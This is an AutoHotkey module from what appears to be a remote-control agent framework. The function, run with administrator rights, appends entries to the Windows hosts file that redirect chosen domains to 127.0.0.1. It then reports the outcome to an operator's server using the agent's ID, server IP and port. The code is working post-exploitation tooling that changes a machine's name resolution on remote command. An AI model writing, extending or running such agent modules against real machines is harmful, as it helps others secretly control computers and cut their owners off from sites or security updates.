; ============================================================================
; HOST FILE URL BLOCK MODULE
; ============================================================================
; Blocks domains by modifying the Windows hosts file
; Requires administrative privileges
; ============================================================================

HostFileURLBlock(domains := ["example1.com", "example2.com", "example3.com"], redirectIP:= "127.0.0.1"){

    hostFile := A_WinDir "\System32\drivers\etc\hosts"

    if A_IsAdmin {

        fileHandle := ""

        ; Open the hosts file in append mode
        fileHandle := FileOpen(hostFile, "a")

        ; Write domain entries to the hosts file
        try {
            for domain in domains {
                fileHandle.WriteLine(redirectIP . " " . domain)
                fileHandle.WriteLine(redirectIP . " www." . domain)
                data .= "`nSuccessfully added entries for: " domain
            }
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)

        } catch as err {
            message := Format("command_output|{}|Module failed: {}", this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)

        } finally {
            if fileHandle {
                fileHandle.Close()  ; Ensure the file is closed even if an error occurs
            }
        }
    } else {
        message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
}
